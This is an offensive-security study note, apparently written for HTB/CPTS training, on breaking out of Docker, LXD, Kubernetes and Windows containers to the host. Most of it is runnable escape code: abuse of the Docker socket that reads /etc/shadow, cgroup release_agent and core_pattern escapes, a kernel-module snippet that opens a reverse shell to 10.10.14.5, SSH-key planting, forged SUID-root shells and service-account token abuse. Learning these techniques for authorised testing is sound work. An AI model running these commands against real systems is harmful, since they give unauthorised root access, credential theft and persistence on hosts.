# Container Escape

#ContainerEscape #Docker #Kubernetes #LXD #Privesc #CapSysAdmin #DockerSocket #ContainerBreakout #Linux #PostExploitation

## What is this?

Breaking out of a container to the underlying host, from a shell you already have *inside* the container — regardless of how you got it (web RCE, SSH, a chained privesc). Escape is almost never a kernel 0-day; it's an **enumeration problem**: find the one thing the container was handed that it shouldn't have (a mounted Docker socket, a dangerous capability, a host bind-mount, group membership) and abuse it. Pairs with [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]], [[Services/Web Services/Docker API|Docker API]], [[Services/Cloud & Data/Kubernetes|Kubernetes]]; defensive counterpart is [[Frameworks and Compliance/Container-Security|Container Security]].

---

## Tools

| Tool | Use |
|---|---|
| `capsh` / `grep Cap /proc/self/status` | Enumerate & decode the container's capability set |
| `nsenter` | Enter the host's namespaces once you have `hostPID` / a mount handle |
| `docker` / `kubectl` clients | Drive an exposed socket / API into a host-mounting container |
| [[Tools/Scanning/linPEAS|linPEAS]] | Auto-flags `.dockerenv`, caps, docker.sock, writable mounts |
| [deepce](https://github.com/stealthcopter/deepce) | Docker Enumeration, Escalation of Privileges and Container Escapes — one script, runs all checks below |
| [CDK](https://github.com/cdk-team/CDK) | Zero-dependency container pentest toolkit; `cdk evaluate` (enum) + `cdk run <exploit>` (release_agent, core_pattern, mount-based) |

> [!note] **Where the other container notes fit.** This note is the "I'm *inside* a container, get me out" workflow. The *exposed-daemon* angle (Docker API on `2375/2376`, or a socket you reach over the network) lives in [[Services/Web Services/Docker API|Docker API]]; the *orchestration* angle (kubelet, etcd, service-account tokens, RBAC) lives in [[Services/Cloud & Data/Kubernetes|Kubernetes]]. Start here to triage, branch out to those for depth.

---

## Am I in a container?

```bash
ls -la /.dockerenv                     # Docker marker file
ls -la /run/.containerenv              # Podman marker file
systemd-detect-virt -c                 # prints 'docker' / 'lxc' / 'podman' if containerized
cat /proc/1/cgroup                     # 'docker' / 'lxc' / 'kubepods' in the paths (cgroup v1)
cat /proc/1/environ | tr '\0' '\n' | grep -iE 'container|kube'   # container=docker/lxc, KUBERNETES_* vars
env | grep -iE 'kube|docker'
hostname                               # random 12-char hex ≈ a container ID
grep -i overlay /proc/self/mountinfo   # overlayfs root = containerized
```

> [!note] **cgroup v2** (modern hosts) collapses `/proc/1/cgroup` to a single `0::/` line, so the classic grep can come up empty. Fall back to `/.dockerenv`, `systemd-detect-virt -c`, and `mountinfo` — those still give it away.

---

## Enumerate the escape surface

One `id`, one `capsh --print`, one `mount` — then read this table top-to-bottom. The first row that matches is usually the escape. (Or just run `deepce` / `cdk evaluate` and let it do this.)

| Signal | How to check | → Escape route |
|---|---|---|
| `docker.sock` present | `ls -la /var/run/docker.sock` | [Docker socket](#docker-socket-exposed) → spawn a host-mounting container |
| In `docker` / `lxd` group | `id` | [Group membership](#docker--lxd-group) → host-FS mount |
| Privileged / `CAP_SYS_ADMIN` | `capsh --print` | [release_agent](#privileged-container--dangerous-capabilities) or mount the host disk |
| `CAP_SYS_MODULE` | `capsh --print` | Load a kernel module that shells the host |
| `CAP_DAC_READ_SEARCH` | `capsh --print` | Read any host file (`open_by_handle_at` / "shocker") |
| `CAP_SYS_PTRACE` + `hostPID` | `capsh --print`; `ls /proc/1/root` | Inject into a host process |
| Host path bind-mounted in | `mount`, `findmnt`, `cat /proc/mounts` | Read/write host files directly (often `/`, `/root`, docker.sock, `/etc`) |
| Host disk device visible | `fdisk -l`; `ls -la /dev/sd* /dev/nvme*` | `mount` the disk + `chroot` |
| Writable host `/proc/sys` | `cat /proc/sys/kernel/core_pattern` (writable?) | `core_pattern` crash handler runs on host |
| K8s SA token | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | [Kubernetes](#kubernetes-pod--node) → API → privileged pod |

**Decode the capability set** (a "privileged" container has them all):

```bash
capsh --print                          # human-readable current caps
grep Cap /proc/self/status             # CapInh/CapPrm/CapEff bitmasks
capsh --decode=0x000001ffffffffff      # decode a mask → all-caps ≈ --privileged
```

---

## Docker socket exposed

`/var/run/docker.sock` bind-mounted into the container = **instant root on the host** — the socket is the Docker daemon's full API, and the daemon runs as root. No `docker` group, no privileged flag needed.

```bash
# With the docker client present in the container:
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host sh
# → root shell on the host filesystem
```

```bash
# No docker client? Drive the API raw over the socket with curl — create a
# container that bind-mounts host / and runs chroot, then read its logs:
curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh","-c","id; cat /host/etc/shadow"],
       "HostConfig":{"Binds":["/:/host"]},"AttachStdout":true,"Tty":true}' \
  http://localhost/containers/create?name=esc
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/esc/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/esc/logs?stdout=1"
```

> [!tip] For persistence/interactivity instead of a one-shot, create the container with `"Cmd":["chroot","/host","bash","-c","echo 'ssh-ed25519 AAAA... you@kali' >> /root/.ssh/authorized_keys"]` and then SSH straight into the host as root. Same daemon, cleaner shell.

---

## docker / lxd group

Membership in either group is root-equivalent because both let you launch a container that mounts host `/`.

```bash
id                                     # look for docker / lxd / lxc

# docker group → mount host FS
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd group → import a minimal image, make it privileged, bind host / into it
# (build alpine.tar.gz on attacker: git clone github.com/saghul/lxd-alpine-builder; sudo ./build-alpine)
lxc image import ./alpine.tar.gz --alias esc
lxc init esc c1 -c security.privileged=true
lxc config device add c1 host disk source=/ path=/mnt/root recursive=true
lxc start c1 && lxc exec c1 /bin/sh
# inside: cd /mnt/root → full host FS as root
```

---

## Privileged container & dangerous capabilities

A `--privileged` container (all caps + no device cgroup) can just mount the host disk. Individual dangerous caps each give their own path.

### Mount the host disk (privileged / `CAP_SYS_ADMIN` + device access)

```bash
fdisk -l                               # find the host disk
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host                       # root on the host
```

### cgroup `release_agent` (`CAP_SYS_ADMIN`, no host disk needed, cgroup v1)

The kernel runs the cgroup `release_agent` binary **on the host as root** when a cgroup empties. If we can mount cgroupfs (we have `CAP_SYS_ADMIN`), we point it at a script on the container's overlay upperdir (which *is* a real path on the host) and trigger it.

```bash
mkdir /tmp/x && mount -t cgroup -o rdma cgroup /tmp/x 2>/dev/null \
  || mount -t cgroup -o memory cgroup /tmp/x
mkdir -p /tmp/x/esc && echo 1 > /tmp/x/esc/notify_on_release

# host-side path of our overlay upperdir → where the host can see files we write
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host/exp" > /tmp/x/release_agent
printf '#!/bin/sh\nid > %s/out 2>&1\n' "$host" > /exp && chmod +x /exp

# empty the cgroup → kernel fires release_agent as root on the host
sh -c "echo \$\$ > /tmp/x/esc/cgroup.procs"
sleep 1 && cat /out                    # swap the payload for a reverse shell to the host
```

> [!warning] **cgroup v1 only.** The `release_agent` file doesn't exist in the cgroup-v2 unified hierarchy, and many hardened runtimes now mask it. If this fails, fall through to `core_pattern` or a mount-based escape. `cdk run release_agent` automates the whole PoC.

### `CAP_SYS_MODULE` → load a kernel module

Load an LKM whose `init` calls `call_usermodehelper()` to run a command on the host as root:

```c
// reverse.c — module_init runs on insmod, in the host kernel context
static char *argv[] = {"/bin/bash","-c",
  "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1", NULL};
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
```
```bash
make -C /lib/modules/$(uname -r)/build M=$PWD modules && insmod reverse.ko
```

### `CAP_DAC_READ_SEARCH` → read any host file

Bypasses all file DAC read checks. Using `open_by_handle_at()` (the classic "shocker" technique) you can brute-force host inodes and read `/etc/shadow`, root's SSH keys, etc. — no mount required. Both `deepce` and `cdk run` carry a ready PoC.

### `CAP_SYS_PTRACE` + shared host PID namespace → inject into a host process

With `hostPID` (you'll see host processes in `ps aux` / `ls /proc/1/root`), attach to a root-owned host process and inject shellcode, or just `nsenter` into PID 1's namespaces:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

---

## Sensitive host mounts

Even an unprivileged container escapes trivially if it was handed the wrong mount. Check `mount` / `findmnt` for host paths.

| Mounted in | Escape |
|---|---|
| `/` or `/root` | Read/write host files directly; drop an SSH key, edit `/etc/passwd`, cron |
| A **single** host dir, rw (e.g. `/home/bob`) | You can't chroot, but container-root sets owner+mode → [forge a SUID-root bash / `authorized_keys`](#writable-bind-mount-of-a-single-host-path-youre-root-on-the-container-side) |
| `/var/run/docker.sock` | See [Docker socket](#docker-socket-exposed) |
| `/etc` | Add a root user / sudoers entry |
| Host `/proc` (rw) | `core_pattern` handler below |

**`core_pattern` crash-handler escape** — if `/proc/sys/kernel/core_pattern` is writable (host `/proc` mounted rw, or privileged), the pipe handler after a crash runs **on the host as root**:

```bash
# point core dumps at a script living on our overlay upperdir (visible to the host)
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab)
printf '#!/bin/sh\nid > /output\n' > "$host/exp" 2>/dev/null; chmod +x "$host/exp"
echo "|$host/exp" > /proc/sys/kernel/core_pattern
# then segfault any process in the container to trigger it
tail -f /dev/null & sleep 1; kill -SIGSEGV %1
```
`cdk run core-pattern` does this end-to-end with a reverse shell.

### Writable bind-mount of a *single* host path (you're root on the container side)

The table above assumes the mount is `/`, `/etc`, or `/root` — mount the disk, `chroot`, done. The subtler and more common case: **only one host directory is bind-mounted** — often a user's home (`/home/bob`), not a system path. You can't `chroot` and there's no `/etc/passwd` to edit through it. It's still a full escape, because a **rw bind mount carries file *metadata*, not just contents** — and you are **root on the container side**, so you set ownership and mode bits that a host user can't set for themselves. Two payloads come off that one primitive:

```bash
# --- enumerate: is there an anomalous host-disk mount? ---
mount | grep -E '/dev/(sd|nvme|vd)'
# Docker ALWAYS bind-mounts these three from the host disk — they are NORMAL, ignore them:
#   /dev/sda1 on /etc/resolv.conf
#   /dev/sda1 on /etc/hostname
#   /dev/sda1 on /etc/hosts
# The finding is a host-disk mount on ANY OTHER path, e.g.:
#   /dev/sda1 on /home/bob type ext4 (rw,relatime,...)   <-- the seam
```

The host user (`bob`) can't `chown root` a file; **container-root can**, and the owner/mode cross the mount to the host side. So:

```bash
# Payload A — plant an SSH key to become that host user (no reusable password needed).
#   Read the user's NUMERIC uid off the mount itself — the container's /etc/passwd is
#   the CONTAINER's, so its names/uids need not match the host:
uid=$(stat -c '%u' /home/bob)
mkdir -p /home/bob/.ssh && echo 'ssh-ed25519 AAAA... you@kali' > /home/bob/.ssh/authorized_keys
chown -R "$uid:$uid" /home/bob/.ssh          # ownership crosses to the host
chmod 700 /home/bob/.ssh && chmod 600 /home/bob/.ssh/authorized_keys   # sshd StrictModes
# then SSH in as bob (see the gateway note below if external :22 is closed)

# Payload B — forge a SUID-root shell for that host user to run.
#   Copy bash on the HOST side (host libc), set the SUID bit from the CONTAINER side:
# on the HOST (as bob):        cp /bin/bash /home/bob/bash
# in the CONTAINER (as root):  chown root:root /home/bob/bash && chmod 4755 /home/bob/bash
# on the HOST (as bob):        /home/bob/bash -p        # -p is MANDATORY -> euid=0
```

> [!warning] **Two silent traps.** (1) `bash -p` or nothing — bash drops its effective uid when `euid != uid` unless `-p` is passed; without it the shell "works" and `id` shows the plain user. (2) `chmod root:root` + `4755`, **not** `g+s` — `g+s` sets egid 0 only. Same gotcha table as [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc#SUID / SGID Binaries|Linux Priv Esc → SUID]]. Copy bash on the **host** side — a container binary is built against a different libc and may not run on the host.

> [!tip] **The host is one hop away — through the bridge, not the internet.** The container's default gateway *is* the host (`ip route` → `default via 172.x.0.1`). SSH is frequently **open on that internal interface but firewalled off externally**, which is why your external nmap saw only the web port. Sweep the gateway from inside (`for p in 22 2222; do (echo >/dev/tcp/172.19.0.1/$p) 2>/dev/null && echo "$p open"; done`) and SSH there with the key/creds above. Note: SSH **password** auth fails from a raw reverse shell with no TTY in a way that mimics a bad credential — upgrade first (`python -c 'import pty;pty.spawn("/bin/bash")'`).

**Why this beats the generic vectors:** everything else can be hardened and this still works. When you find cgroups **ro**, `/proc/sys` **ro**, no `docker.sock`, and `/proc/kcore`/`keys`/`sched_debug` tmpfs-masked, that's **stock Docker hardening, not `--privileged`** — the generic escapes are all closed. The one thing left is a mount the operator *chose* to add. Hardened-everywhere-except-one-mount is the signature of exactly this escape.

---

## Kubernetes pod → node

If you landed in a **pod**, the escape surface is different (service-account token, kubelet, hostPath volumes). Triage: read the SA token, check your RBAC, look for a way to schedule a privileged pod on the node.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
# can you create pods? → launch a privileged pod that nsenters the node:
kubectl auth can-i create pods
```

Full playbook — anonymous API, kubelet `10250` exec, etcd secret dump, privileged-pod-with-`hostPID`+`nsenter`, cloud metadata from inside a pod — is in [[Services/Cloud & Data/Kubernetes|Kubernetes]].

---

## Windows containers

Rare in practice and thin compared to Linux. Windows Server (process-isolated) containers **share the host kernel**, so the surface is real but narrow; Hyper-V-isolated containers have their own kernel and are much harder.

- **Detect:** `HKLM\SYSTEM\CurrentControlSet\Control\ContainerType` in the registry, `cexecsvc.exe` running, or `wcifs.sys` / `\\.\pipe\docker_engine` present.
- **Named pipe `\\.\pipe\docker_engine`** mounted in ≈ the Linux `docker.sock` case → drive the daemon to a host-mounting container.
- **Process isolation shares the kernel** → a host kernel exploit or a symbolic-link/`wcifs` junction attack can reach host files.
- Mostly a research topic (e.g. the *Siloscape* malware, argument-injection CVE classes) rather than a routine CPTS/HTB path — treat it as an appendix and pivot to host kernel/priv-esc techniques in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]].

---

## Quick Reference

| Situation | Escape |
|---|---|
| Am I contained? | `ls /.dockerenv`; `systemd-detect-virt -c`; `cat /proc/1/cgroup` |
| Enumerate everything | `deepce` / `cdk evaluate` (or `linpeas`) |
| `docker.sock` mounted | `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh` |
| `docker` group | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` group | `lxc init esc c1 -c security.privileged=true; lxc config device add c1 h disk source=/ path=/mnt recursive=true` |
| Privileged / host disk visible | `mount /dev/sda1 /mnt/host && chroot /mnt/host` |
| One rw host dir mounted (`/home/x`) | Container-root forges owner+mode: `chown root:root x/bash && chmod 4755 x/bash` → host runs `bash -p` |
| `CAP_SYS_ADMIN`, no disk | cgroup `release_agent` PoC / `cdk run release_agent` |
| `CAP_SYS_MODULE` | `insmod` an LKM calling `call_usermodehelper()` |
| `CAP_DAC_READ_SEARCH` | `open_by_handle_at` file read ("shocker") |
| `hostPID` + `CAP_SYS_PTRACE` | `nsenter --target 1 --mount --pid -- bash` |
| Writable host `/proc` | `echo '|/path/exp' > /proc/sys/kernel/core_pattern` + crash |
| K8s pod | Read SA token → `kubectl auth can-i create pods` → privileged pod |

---

> [!note] **See also** — got the shell via a network-exposed daemon rather than a mount? [[Services/Web Services/Docker API|Docker API]]. Landed in a pod? [[Services/Cloud & Data/Kubernetes|Kubernetes]]. Escaping is step one of [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]] once you're on the host. Defensive view: [[Frameworks and Compliance/Container-Security|Container Security]]. Index: [[Techniques/_Techniques|_Techniques]].

---

*Created: 2026-08-28*
*Updated: 2026-08-28*
*Model: claude-opus-5*
